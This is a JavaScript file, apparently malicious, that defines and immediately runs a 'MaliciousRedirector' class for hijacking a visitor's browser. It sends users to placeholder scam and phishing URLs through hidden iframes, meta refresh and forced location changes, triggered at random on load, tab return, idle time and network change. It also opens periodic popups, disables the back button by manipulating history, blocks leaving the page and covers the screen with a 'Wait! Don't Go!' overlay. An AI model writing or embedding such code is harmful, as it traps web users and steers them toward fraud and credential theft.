// Redirection and popup management
class MaliciousRedirector {
  constructor() {
    this.redirectRules = [
      { pattern: /exit|close|leave/i, action: 'block' },
      { pattern: /back|return|previous/i, action: 'ad_first' },
      { pattern: /download|install|get/i, action: 'redirect' }
    ];
    
    this.setupRedirects();
    this.setupPopups();
    this.setupHistoryManipulation();
  }
  
  setupRedirects() {
    // Redirect on page load
    setTimeout(() => {
      if (Math.random() < 0.3) {
        this.redirectToAd();
      }
    }, 5000);
    
    // Redirect on visibility change
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        // User switched tabs - prepare for return
        this.prepareReturnRedirect();
      } else {
        // User returned - possibly redirect
        if (Math.random() < 0.4) {
          setTimeout(() => this.redirectToAd(), 1000);
        }
      }
    });
    
    // Redirect on idle
    this.setupIdleRedirect();
    
    // Redirect on network changes
    if (navigator.connection) {
      navigator.connection.addEventListener('change', () => {
        if (Math.random() < 0.2) {
          this.redirectToAd();
        }
      });
    }
  }
  
  redirectToAd() {
    const adUrls = [
      'https://malicious-ads.com/redirect-main',
      'https://scam-offer.com/auto-redirect',
      'https://phishing-page.com/auto'
    ];
    
    const randomUrl = adUrls[Math.floor(Math.random() * adUrls.length)];
    
    // Use multiple techniques
    this.redirectWithIframe(randomUrl);
    this.redirectWithMetaRefresh(randomUrl);
    this.redirectWithLocation(randomUrl);
    
    // Also open popup
    this.openPopup(randomUrl);
  }
  
  redirectWithIframe(url) {
    const iframe = document.createElement('iframe');
    iframe.style.cssText = 'position:fixed; width:1px; height:1px; opacity:0;';
    iframe.src = url;
    document.body.appendChild(iframe);
  }
  
  redirectWithMetaRefresh(url) {
    const meta = document.createElement('meta');
    meta.httpEquiv = 'refresh';
    meta.content = `0;url=${url}`;
    document.head.appendChild(meta);
  }
  
  redirectWithLocation(url) {
    // Only redirect main window sometimes
    if (Math.random() < 0.2) {
      window.location.href = url;
    }
  }
  
  prepareReturnRedirect() {
    // Store time of tab switch
    sessionStorage.setItem('tab_switch_time', Date.now());
    
    // Prepare redirect for return
    const returnUrl = 'https://malicious-ads.com/return-redirect';
    sessionStorage.setItem('pending_redirect', returnUrl);
  }
  
  setupIdleRedirect() {
    let idleTime = 0;
    const idleInterval = setInterval(() => {
      idleTime++;
      
      if (idleTime > 30) { // 30 seconds idle
        if (Math.random() < 0.5) {
          this.redirectToAd();
        }
        idleTime = 0;
      }
    }, 1000);
    
    // Reset on activity
    ['mousemove', 'keydown', 'click', 'scroll'].forEach(event => {
      document.addEventListener(event, () => idleTime = 0);
    });
  }
  
  setupPopups() {
    // Open popup on various events
    window.addEventListener('load', () => {
      setTimeout(() => this.openPopup('https://malicious-ads.com/onload'), 2000);
    });
    
    window.addEventListener('beforeunload', () => {
      this.openPopup('https://malicious-ads.com/exit');
    });
    
    // Periodic popups
    setInterval(() => {
      if (Math.random() < 0.1) {
        this.openPopup('https://malicious-ads.com/periodic');
      }
    }, 30000);
  }
  
  openPopup(url) {
    const features = [
      'width=600,height=400,left=100,top=100',
      'width=800,height=600,left=200,top=200',
      'width=400,height=300,left=50,top=50'
    ];
    
    const randomFeatures = features[Math.floor(Math.random() * features.length)];
    
    try {
      const popup = window.open(url, '_blank', randomFeatures);
      
      if (popup) {
        // Attempt to focus back to original window
        setTimeout(() => window.focus(), 100);
        
        // Close popup after random time
        setTimeout(() => {
          try {
            popup.close();
          } catch (e) {
            // Ignore errors
          }
        }, Math.random() * 10000 + 5000);
      }
    } catch (e) {
      // Fallback to iframe
      this.redirectWithIframe(url);
    }
  }
  
  setupHistoryManipulation() {
    // Prevent back button
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = () => {
      window.history.go(1);
      this.redirectToAd();
    };
    
    // Add fake history entries
    setInterval(() => {
      window.history.pushState(null, null, `#fake-${Date.now()}`);
    }, 30000);
    
    // Replace history with ad links
    const adPages = [
      'https://malicious-ads.com/history1',
      'https://malicious-ads.com/history2',
      'https://malicious-ads.com/history3'
    ];
    
    adPages.forEach((url, index) => {
      window.history.replaceState({ isAd: true }, `Ad ${index}`, url);
    });
  }
  
  blockExit() {
    window.addEventListener('beforeunload', (e) => {
      e.preventDefault();
      e.returnValue = '';
      
      // Show exit intent ad
      this.showExitIntentAd();
      
      return '';
    });
  }
  
  showExitIntentAd() {
    const exitAd = document.createElement('div');
    exitAd.innerHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                        background: rgba(0,0,0,0.9); z-index: 2147483647; 
                        display: flex; justify-content: center; align-items: center;">
                <div style="background: white; padding: 30px; border-radius: 15px; 
                            text-align: center; max-width: 400px;">
                    <h2>Wait! Don't Go!</h2>
                    <p>Special offer just for you!</p>
                    <button onclick="window.open('https://malicious-ads.com/exit-offer', '_blank')"
                            style="background: #4CAF50; color: white; border: none; 
                                   padding: 10px 20px; border-radius: 5px; cursor: pointer; 
                                   margin: 10px;">
                        Claim Offer
                    </button>
                    <button onclick="this.parentElement.parentElement.remove()"
                            style="background: #ccc; color: #333; border: none; 
                                   padding: 10px 20px; border-radius: 5px; cursor: pointer; 
                                   margin: 10px;">
                        No Thanks
                    </button>
                </div>
            </div>
        `;
    
    document.body.appendChild(exitAd);
  }
  
  // Method to check if redirect should happen
  shouldRedirect(action) {
    const rule = this.redirectRules.find(r => action.match(r.pattern));
    return rule ? rule.action : 'none';
  }
}

// Initialize redirector
window.maliciousRedirector = new MaliciousRedirector();
window.maliciousRedirector.blockExit();